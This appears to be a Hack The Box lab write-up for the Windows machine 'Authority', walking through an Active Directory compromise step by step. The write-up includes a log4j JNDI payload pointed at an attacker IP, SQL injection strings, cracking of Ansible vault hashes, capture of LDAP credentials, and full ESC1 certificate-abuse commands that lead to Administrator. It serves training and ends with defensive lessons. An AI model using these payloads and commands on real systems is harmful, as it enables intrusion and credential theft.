![](assets/images/banner.png)



<img src="assets/images/Authority.png" style="margin-left: 20px; zoom: 60%;" align=left />    	<font size="10">Authority</font>

​		Released 15th July 2023

​		Machine Author(s):  [mrb3n8132 &](https://app.hackthebox.com/users/2984) [Sentinal](https://app.hackthebox.com/users/206770)

 


### About Authority:

Authority is a medium-difficulty Windows machine that highlights the dangers of misconfigurations, password reuse, storing credentials on shares, and demonstrates how default settings in Active Directory (such as the ability for all domain users to add up to 10 computers to the domain) can be combined with other issues (vulnerable AD CS certificate templates) to take over a domain.

### Difficulty:

`Medium`

# Enumeration

As always, we start with a simple nmap scan:

```
nmap 10.10.11.222 -F -Pn -v
```

-F Flag for "fast" scan - this will finish quicker and should give us good idea of what we're dealing with, without taking too much time 

-Pn to disable ping-check, in case its one of those machines that doesn't respond to pings

-v so we can see the output and potentially port information without needing to wait for the whole scan to finish. 

<img src="assets/images/Authority/Nmap1.png"/>

**Port 53,389,88,139,445** - domain, ldap, smb and kerberos, likely this is a Windows machine and likely a domain controller. 

**Port 8443** is interesting and would be somewhat 'out of the ordinary' - certainly worth a quick look before moving on to other enumeration steps:

<img src="assets/images/Authority/84431.png"/>

Interesting. "Password Self Service" possibly some kind of password management system? It also appears to be in "configuration mode".

*"This mode allows updating the configuration without authenticating to an LDAP directory first"* - Okay that just *sounds* insecure. Updating configuration without authenticating? Ouch. Hopefully no one has already saved credentials here.

We have a few options:

<img src="assets/images/Authority/pwm1.png"/>


Configuration Manager and Configuration Editor. Both the manager and editor present you with this screen:

<img src="assets/images/Authority/pwmconfig1.png"/>

There is a password prompt as well as a list of previous authentications. 

The previous authentications list exposes a username. **svc_pwm** . As an attacker, we are always looking for sets of valid credentials. Usually this consists of a username and a password, and you need *both* to authenticate usually. Usually people only consider the password to be sensitive, which is mostly correct. But if an attacker has *neither* a valid password *or* a valid username it does make their job harder. 

If you can help it: Expose the *least* amount of information to potential attackers as possible. Sometimes it can't be helped, but if you don't absolutely need to show usernames, don't. As an attacker, this is a win. Small, but it is a win. 

From the name, this could be a service account used to run the PWM service. 

Entering a random password into the password field results in: 

<img src="assets/images/Authority/password1.png"/>

This error message doesn't seem to be filtered really and could be directly from the output of whatever process is happening in the background to authenticate passwords. Again, the theme of exposing the least amount of information to potential attackers appears - little pieces of information that seem benign on the surface can give an attacker more information than you want to give him. 

For me, this kind of error message signals that I should try injecting special characters into that field. If the input isn't sanitized correctly and I get to see the whole error output maybe I can get the error message to read me out something it shouldn't, or give me some more information.

Injecting various random special characters into the field seems to just yield the same result:

```
' OR 1=1--
<php>
{5*5}
~~!@#$##$#$%$%<<>>!?@?!@<()(({{}}""::>))
```

<img src="assets/images/Authority/password1.png"/>

So, this could be a tiny rabbit hole perhaps. I'll hold off brute forcing the field and do some more enum. 

The menu button exposes a version number:

<img src="assets/images/Authority/pwmv.png"/>

Lets do a quick google for the software + version number + "exploit":


<img src="assets/images/Authority/pwmgoogle.png"/>

This is really the only thing I can see from googling for exploits - it appears to be related to the **log4j** exploit. 

Lets try setting up a netcat listener
```
nc -lvnp 1389
```

And just putting this into the password field: 

```
${jndi:ldap://<attackerIP>:1389/a}
${jndi:ldap://10.10.14.3:1389/a}
```

Nada, same error message. Okay, better leave this for now and look for other low-hanging fruit. Time for some more enumeration. 

```
enum4linux 10.10.11.222
```

Getting a lot of access denied errors...

<img src="assets/images/Authority/enum4linux1.png"/>


And I get the same errors using the user account from the website
```
enum4linux 10.10.11.222 -u "svc_pwm" -p ""
```

Likely we'll need both a valid username and password to enumerate further using enum4linux. 

Maybe I *will* just start brute-forcing this password field...

In order to use Hydra to brute this password, I'll need some information about the request that is made when you hit "submit" on the password form. 

You *can* do this through the browsers development panel, but I prefer burp-suite just for ease of use. 

<img src="assets/images/Authority/burppassword1.png"/>

Ah, ouch it has a "number only used once" in the password POST request... meaning in order to brute this properly we'll need to get the new FormID from the page response. Which... isn't impossible, but might require more work than needed at this stage. Lets check everything else and come back to this later. 

Lets do a dirbuster on the website and see if there are any pages we can see we weren't intended to: 

<img src="assets/images/Authority/dirbuster1.png"/>


And then at the same time lets try to see if we can get *any* extra information from this machine just using the username that we found earlier.

Starting with smbmap:

```
smbmap -H 10.10.11.222 -u "svc_pwm" 
```

<img src="assets/images/Authority/smbmap1.png"/>

Nice - apparently we can read the "Development" share as the user svc_pwm... with no password!

```
smbmap -H 10.10.11.222 -u "svc_pwm" -r Development --depth 10
```

-r Flag to recursively list files
--depth for how deep. 

Errr... it looks like there is quite a bit of files:

<img src="assets/images/Authority/smbmap2.png"/>

Better maybe to just download all the files and take a look at them that way...

```
smbget smb://10.10.11.222/Development -U authority.htb/svc_pwm% --recursive
```


# Foothold

Now that the files are downloaded, lets cd to the downloaded file folder, and do a quick grep for passwords. 

```
grep -r "password"
```

<img src="assets/images/Authority/greppassword1.png"/>

Sadly, plaintext credentials in files are all too common. Good for us, bad for authority.htb .

Testing for password reuse...it doesn't look like any of the passwords are valid for the website...

<img src="assets/images/Authority/incorrect1.png"/>

Neither am I able to authenticate as svc_pwm with any of the credentials either:



But, looking through the files, I did find this:

<img src="assets/images/Authority/ansiblehash1.png"/>

After some googling it seems these are Ansible vaults - essentially encrypted values of likely sensitive information. Bitwarden and other services offer similar features. You take a value like a password, a file, or small note, encrypt it, and store it in a password-manager or vault program for recall later. When you want to read-it, you enter the notes password, which will decrypt the contents and allow you to read the note. You cant read the note without the password, even if you get your hands on the vault. It's like the ultimate version of a diary lock. Very handy for storing passwords or other sensitive information away from prying eyes... but... not so much if you use a weak vault password...


 We can take these vault lines, which are essentially hashes, and put them in separate files, then use ansible2john:

```bash
ansible2john creds1.vault creds2.vault creds3.vault > creds.hash
```

To get a file we can pass to hashcat or john the ripper for cracking.  

We put together 3 separate files with 

```
$ANSIBLE_VAULT;1.1;AES256
```

On the first line, and the hash on the second, like so:

```
$ANSIBLE_VAULT;1.1;AES256
633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
```

And run ansible2john, include all three files as command line arguments, then save the output to a file:

```
ansible2john ./ldap_admin_password ./pwm_admin_login ./pwm_admin_password > creds.hash
```

The resulting file is something we can give to hashcat to hopefully have it crack the decryption password.

We'll run hashcat in the appropriate mode for these hashes, and run them through rockyou.

```
hashcat -m 16900 ./creds.hash /usr/share/wordlists/rockyou.txt --user
```

-m 16900 for Ansible Vault hashtype
--user to tell hashcat to ignore the 'username' at the start of every hash

<img src="assets/images/Authority/cracked1.png" style="zoom: 200%;" align=left/>

Bingo!

All three notes are encrypted with the same password. Which, for password vaults isn't uncommon. Generally one password will unlock the entire vault and let you read whatever is stored there. But... this password isn't exactly the most secure. I mean, *it shows up in rockyou* .

```
!@#$%^&*
```


With the vault passwords, we should be able to decrypt and read those very same vault entries.

We can do this by just pasting the vault entries into separate files like so:

<img src="assets/images/Authority/vaultpass.png"/>

And then using 

```
ansible-vault decrypt <file_name>
```

Entering the vault password when prompted...

<img src="assets/images/Authority/decryptionSuccessfull1.png"/>

Nice.

The decrypted values look like a username, and two passwords. 

And, one of the passwords gets us into the configuration menus:

<img src="assets/images/Authority/config1.png"/>

We can download the configuration file with a button on the website, and we can see there is an encoded password for the svc_ldap user.

<img src="assets/images/Authority/ldapPassword.png"/>

But, I can't seem to determine what format it is in. Either by passing it to hashcat directly, or through googling. 

However, we can edit the LDAP configuration, changing the server from authority.htb to our own attack box, and changing the protocol from LDAPS to LDAP so that the connection data is not encrypted. This should hopefully cause this system to try and connect to my attacker machine instead of its own local LDAP instance. 

<img src="assets/images/Authority/ldapConfig1.png"/>

Setup a listener with netcat:

```
nc -lvnp 638
``` 

Then:

<img src="assets/images/Authority/testLdap.png"/>

To test our connection and...

<img src="assets/images/Authority/ldapClear.png"/>

We get a password!

And its valid for the svc_ldap user!

<img src="assets/images/Authority/valid1.png"/>


With valid domain credentials we might be able to preform additional enumeration such as getting a list of all valid domain usernames, computers, GPO's, their permissions and object control inheritance, list extra smb shares or even get a shell or issue commands to the server.


Running smbmap with the new credentials reveals svc_ldap can read the "Department Shares" share:

```
smbmap -H 10.10.11.222 -u "svc_ldap" -p '<password_here>'
```

<img src="assets/images/Authority/smb2.png"/>

But... after downloading the share... it doesn't look like anything is there really. A bunch of empty folders.

However...

```
evil-winrm -i 10.10.11.222 -u "svc_ldap" -p '<password_here>'
```

Gets us a shell!

<img src="assets/images/Authority/foothold.png"/>

Very nice.


# Privilege Escalation

Once on the box, download and run adPEAS to help look for potential privesc vectors:

```
wget http://10.10.14.13/adPEAS.ps1 -Outfile ./adPEAS.ps1
Import-Module ./adPEAS.ps1
Invoke-adPEAS
```

adPEAS reveals:

<img src="assets/images/Authority/adpeas1.png"/>

Okay, svc_ldap may be able to add a computer to the domain. Honestly, I'm not entirely sure what to do with this at the moment, but this is certainly noted and if something requires me to add a computer to a domain, we apparently have the ability.


Also reveals:

<img src="assets/images/Authority/adpeas2.png"/>

<img src="assets/images/Authority/adpeas3.png"/>

<img src="assets/images/Authority/adpeas4.png"/>

3 certs with the "Enrollee_supplies_subject" flag. I... dont know what this is. Luckily I am connected to the internet and can access google.

A quick google for "Enrollee_supplies_subject" yields a few articles on the matter:

https://redfoxsec.com/blog/exploiting-misconfigured-active-directory-certificate-template-esc1/ says:

###### For exploiting ESC1, we need the Template to meet certain criteria. The Template must have:

- Enrollment Rights are set for the group our user belongs to so that we can request a new certificate from the Certificate Authority (CA).
- Extended Key Usage: Client Authentication means the generated certificate based on this Template can authenticate to the domain computers.
- Enrollee Supplies Subject set to True, which means we can supply SAN (Subject Alternate Name)
- No Manager Approval is required, which means the request is auto-approved.


I believe this cert template fits this criteria:

<img src="assets/images/Authority/adpeas2.png" style="zoom: 110%;"/>

+Has "Enrollee Supplies Subject"
+Any domain computers have enrollment rights
+Extended key usage

I'm not sure if manager approval is required or not but, one way to find out would be to try and exploit this and see if we get an error...


This is a good candidate for the priv esc path I think.

So, step 1)
Is going to be: Add a machine to the domain. Per the permissions set on the cert template, users cannot request or enroll the cert, only the domain computer group has enrollment rights. And so I need a computer account I can control. In Windows AD, computers themselves have a password, almost like a user has a username and a password, computers actually do too. Unfortunately, I don't know the machine password for the only computer object in the domain. 

But fortunately as we learned earlier, the svc_ldap account has permissions to add machine accounts. And when you add a machine account you also get the option to specify a password. 

We can do this from the attacker machine with an Impacket tool:

```
impacket-addcomputer -dc-ip 10.10.11.222 -computer-name supercomputer -computer-pass 'Super5ecret!' 'authority.htb/svc_ldap:<password_here>'
```

<img src="assets/images/Authority/addComputer.png" style="zoom: 110%;"/>


Step 2)

Now that we know a machine password for a computer in the domain, we should be able to request the certificate (a certificate with the user principle name of Administrator!) 

```
certipy req -dc-ip 10.10.11.222 -u supercomputer$ -p 'Super5ecret11#' -target authority.htb -ca AUTHORITY-CA -template CorpVPN -upn Administrator@authority.htb
```

<img src="assets/images/Authority/gotcert.png" style="zoom: 110%;"/>

Nice.

Step 3)

The resulting .pfx file we get from the cert enrollment is not often used for many of the attacker tools that will allow us to do passthecert style attacks. 

So instead we can split the .pfx file into .cer and .key files to be used with these programs:

```
certipy cert -pfx administrator.pfx -nocert -out keyfile.key
certipy cert -pfx administrator.pfx -nokey -out certfile.crt
```

Step 4) 

Check to see if the cert will allow us to authenticate as Administrator:

<img src="assets/images/Authority/administrator1.png" style="zoom: 110%;"/>

We can!

*Very nice*

Step 5) 

Trying to get a shell as Administrator with the .crt and .key files and winrm doesn't seem to want to work:

```
evil-winrm -i 10.10.11.222 -c administrator.crt -k administrator.key -S
```

<img src="assets/images/Authority/evilwinrm1.png" style="zoom: 110%;"/>

Instead, we might be able to use passthecert to do other things as Administrator. 

passthecert can try to add computers to the domain, change user accounts, add user accounts, or give us an "ldap-shell" which is basically a way for us to do essentially the same kinds of things you could do with the "Active Directory Users and Computers" administrative module from a windows machine. 

*Including* changing passwords to accounts. Including our own (Administrator !)

```
passthecert -dc-ip 10.10.11.222 -crt administrator.crt -key administrator.key -domain authority.htb -action ldap-shell

change_password Administrator "Password100"
```


<img src="assets/images/Authority/changepassword.png" style="zoom: 110%;"/>

Success!

Next, we can try evil-winrm again but with Administrators username and new password instead of the certificate files:

<img src="assets/images/Authority/win.png" style="zoom: 110%;"/>

Bingo!! That's all she wrote. We can read the highly sensitive root.txt file on Administrators desktop, and make any changes to the computer or domain we want. 

**Authority.htb is owned** 

# Key Takeaways

When it comes to security, giving out as little information as possible is preferred. Even seemingly benign pieces of information such as usernames can give attackers pieces of the puzzle of how to compromise your assets you shouldn't want them to have. Usernames are usually fairly low-impact pieces of information, but they do make up about 50% of what it takes to login to your systems. If you can hide usernames, or make them harder to guess, this *is* better. Its normally not the end of the world if you're exposing usernames, but really, if you *can help it*, as with any information really. Its better not to give it out unless you need to.

And, if *seemingly benign* pieces of information aren't great to give out, certainly, configuration information for services that will potentially store sensitive data would absolutely be information you would't want to give out. The world (or, anyone on your network) doesn't need to know how exactly you've configured your service. 

So, you wouldn't want to, for example, put them on 'world-accessible' smb shares that anyone can read.

Really, a good general rule of thumb is - if someone doesn't need access to {insert thing here}, they just shouldn't have access. I can't really think of any scenario where configuration information for services you run, services that will potentially hold sensitive information or can act with elevated privileges need to be accessible by *anyone* who can talk to your server.  

If the fictional administrators of this machine/domain simply restricted the shares *a little more*. Maybe to authenticated users only, or better - users part of a specific web administration or ansible group or the like, it would have made compromising this machine much harder. 

When in doubt - don't give it out. Whatever piece of information "it" is.

If not this, *at least* give the encrypted vaults strong vault passwords. If they're going to be accessible to everyone, and you are putting things in your vaults that you *actually* don't want everyone to read. Your vault / keys better be strong.

Putting sensitive information in an encrypted vault with a weak password is like putting jewels in an expensive safe and then locking said expensive safe with a $5 master-lock. Your valuables are only as strong as the weakest link protecting it, so you need to make sure every 'link in the chain' is strong too.

But, this only got us a foothold. The final nail in the coffin was a reconfigured cert template which allowed a machine to essentially ask the CA to issue a cert that would allow us to authenticate as *any other user in the domain* including the administrator. 

Internally, double-checking your certificate templates is as easy as running the same tools an attacker might use to check to see if your templates are vulnerable. Giving your environment a quick run of Certipy or adPEAS can quickly highlight potentially disastrous  configurations. 

After all, It's not just outside attackers you should worry about. If its not just *you* using your services, you need to make sure the people you normally allow on your network can't get crafty and decide to try and become administrator, or access something they shouldn't. 

Not to mention, if you ever have a compromise, you want to make life *as hard as possible* for the threat actors *after* the compromise. The same as before. Breaking into your perimeter could be as easy as a user reusing a password and getting one of their own personal accounts compromised. A disgruntled employee selling their access on the dark-web.  Or a user accidentally giving away a password during a phishing attack. Putting all of your efforts into hardening the exterior of your network, and nothing into also making sure you're also secure internally will bite you in the butt in the event of a breach, just like it did with authority.htb

TL;DR: 

- If you don't need to give out x piece of information, dont!
- Double check world-readable shares for sensitive information
- Use strong passwords!
- Audit your network / domain internally for misconfigurations


